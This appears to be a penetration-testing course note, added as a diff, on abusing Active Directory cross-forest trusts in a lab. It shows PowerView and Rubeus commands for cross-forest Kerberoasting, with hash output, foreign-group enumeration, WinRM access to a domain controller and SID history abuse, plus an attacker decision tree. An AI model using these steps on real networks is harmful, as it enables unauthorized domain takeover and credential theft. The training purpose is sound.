@@ -1,0 +1,185 @@
+Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+Cross-Forest Kerberoasting
+Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.
+
+We can utilize PowerView to enumerate accounts in a target domain that have SPNs associated with them.
+
+Enumerating Accounts for Associated SPNs Using Get-DomainUser
+  Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+samaccountname
+--------------
+krbtgt
+mssqlsvc
+We see that there is one account with an SPN in the target domain. A quick check shows that this account is a member of the Domain Admins group in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.
+
+Enumerating the mssqlsvc Account
+  Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+
+samaccountname memberof
+-------------- --------
+mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+Let's perform a Kerberoasting attack across the trust using Rubeus. We run the tool as we did in the Kerberoasting section, but we include the /domain: flag and specify the target domain.
+
+Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+  Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : mssqlsvc
+[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+[*] SamAccountName         : mssqlsvc
+[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
+[*] PwdLastSet             : 3/24/2022 12:47:52 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
+We could then run the hash through Hashcat. If it cracks, we've now quickly expanded our access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.
+
+Admin Password Re-Use & Group Membership
+From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, then it is worth checking for password reuse across the two forests. I occasionally ran into issues where, for example, Domain A would have a user named adm_bob.smith in the Domain Admins group, and Domain B had a user named bsmith_admin. Sometimes, the user would be using the same password in the two domains, and owning Domain A instantly gave me full admin rights to Domain B.
+
+We may also see users or admins from Domain A as members of a group in Domain B. Only Domain Local Groups allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.
+
+We can use the PowerView function Get-DomainForeignGroupMember to enumerate groups with users that do not belong to the domain, also known as foreign group membership. Let's try this against the FREIGHTLOGISTICS.LOCAL domain with which we have an external bidirectional forest trust.
+
+Using Get-DomainForeignGroupMember
+  Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+
+GroupDomain             : FREIGHTLOGISTICS.LOCAL
+GroupName               : Administrators
+GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
+MemberDomain            : FREIGHTLOGISTICS.LOCAL
+MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
+MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
+                          TICS,DC=LOCAL
+
+PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+
+INLANEFREIGHT\administrator
+The above command output shows that the built-in Administrators group in FREIGHTLOGISTICS.LOCAL has the built-in Administrator account for the INLANEFREIGHT.LOCAL domain as a member. We can verify this access using the Enter-PSSession cmdlet to connect over WinRM.
+
+Accessing DC03 Using Enter-PSSession
+  Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
+inlanefreight\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
+   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
+From the command output above, we can see that we successfully authenticated to the Domain Controller in the FREIGHTLOGISTICS.LOCAL domain using the Administrator account from the INLANEFREIGHT.LOCAL domain across the bidirectional forest trust. This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust situation is present during an assessment and the second forest is in-scope.
+
+SID History Abuse - Cross Forest
+SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest. In the below diagram, we can see an example of the jjones user being migrated from the INLANEFREIGHT.LOCAL domain to the CORP.LOCAL domain in a different forest. If SID filtering is not enabled when this migration is made and the user has administrative privileges (or any type of interesting rights such as ACE entries, access to shares, etc.) in the INLANEFREIGHT.LOCAL domain, then they will retain their administrative rights/access in INLANEFREIGHT.LOCAL while being a member of the new domain, CORP.LOCAL in the second forest.
+
+image
+
+This attack will be covered in-depth in a later module focusing more heavily on attacking AD trusts.
+
+                        GPT SUMMARY 
+
+ SUMMARY — What’s Going On in Cross-Forest Abuse?
+In cross-forest trust abuse, you take advantage of bidirectional or inbound forest trusts to:
+
+Pivot between entire forests
+
+Perform Kerberoasting across forests
+
+Abuse group memberships, password reuse, or SID history if SID filtering isn’t enforced
+
+Gain access to highly privileged accounts in Forest B from Forest A
+
+💥 The core difference:
+Child-parent trust = one forest, structured hierarchy (domain trees)
+
+Cross-forest trust = two separate forests, optionally linked via trust (like two different companies, or divisions)
+
+🧭 WORKFLOWS – “Got This? → Do That”
+🔥 1. Cross-Forest Kerberoasting
+✅ Got This	➡️ Do This
+Bidirectional/inbound forest trust	Use PowerView to enumerate SPN users in target forest
+Found high-priv SPN user (e.g. Domain Admin)	Use Rubeus kerberoast /domain: to pull TGS
+Got the hash?	Crack it offline with Hashcat and use creds to pivot
+Hash cracked?	You now control both domains 🌍🔥
+🔥 2. Cross-Forest Admin Group Membership or Password Reuse
+✅ Got This	➡️ Do This
+Bidirectional trust exists	Use Get-DomainForeignGroupMember to find cross-forest group memberships
+INLANEFREIGHT\admin is member of FREIGHTLOGISTICS\Administrators	Authenticate directly using WinRM (Enter-PSSession)
+Same-named admin accounts in both forests	Check for password reuse across both
+🔥 3. SID History Abuse – Cross-Forest
+✅ Got This	➡️ Do This
+SID filtering not enforced on trust	Add SID of Forest A's DA to user in Forest B via sidHistory
+That user logs in across forest	They retain DA rights in Forest A — boom, cross-forest privilege
+Migration or trust setup improperly hardened	Abuse the legacy sidHistory for token escalation
+🤖 IF THIS ➝ THEN THAT DECISION TREE
+IF…	THEN…
+You find a bidirectional trust	Treat it like a pivot gateway and try Kerberoasting
+You can't escalate locally	Look across the forest — try attacking the other side
+You find SPNs in another domain	Run Kerberoasting using /domain: with Rubeus
+You see group memberships from outside	Use PowerView to trace the user origin and test access
+Admin accounts share usernames	Try password reuse attacks between forests
+SID filtering disabled on trust	Abuse SID history to escalate like in child ➝ parent path
+🧩 PATTERNS + HINTS
+🔍 Pattern	🧠 Insight
+SPN = Kerberoast bait	If it belongs to a high-priv user, roast it across the trust
+Password reuse is common	Especially in M&As or when IT teams manage both forests
+ForeignSecurityPrincipals in Builtin\Administrators	Indicates trust-based admin escalation is possible
+SID filtering OFF = you're golden	Inject cross-forest SIDs into sidHistory for instant privilege
+Forest trust direction matters	If it's only outbound, you may not be able to auth into the other side
+🔄 COMPARISON: CHILD/PARENT vs CROSS-FOREST
+Feature	Child ➝ Parent	Cross-Forest
+Structure	Same forest, hierarchical	Different forests, flat trust
+SID Filtering	Usually OFF	Often ON (but not always)
+ExtraSIDs works?	Yes	Only if SID filtering is off
+Trust Type	Parent-child, transitive	Forest trust, usually bidirectional
+Tools	Mimikatz, Rubeus, PowerView	Same tools, but with -domain flags
+Realistic Abuse?	Very common in M&A	Less common, but huge when misconfigured
+Key Attack	ExtraSID ➝ EA/DA in parent	Kerberoasting, SIDHistory, group abuse
+📝 REPORTING RECOMMENDATIONS
+If you find exploitable cross-forest abuse paths:
+
+Highlight lack of SID filtering as critical risk
+
+Recommend removing foreign users from built-in groups
+
+Suggest monitoring and limiting SPNs tied to privileged users
+
+Flag password reuse across forests as a policy gap
+
+Recommend trust reviews post-M&A or infrastructure consolidation
+
+TL;DR – “Cross-Forest Trust Abuse”
+💣 Same principles, bigger playground.
+You’re no longer playing in subdomains — you’re breaching entire forests now.
+Trust is a two-way street, but when SID filtering is off, it’s also a f***ing freeway.
+
+                       
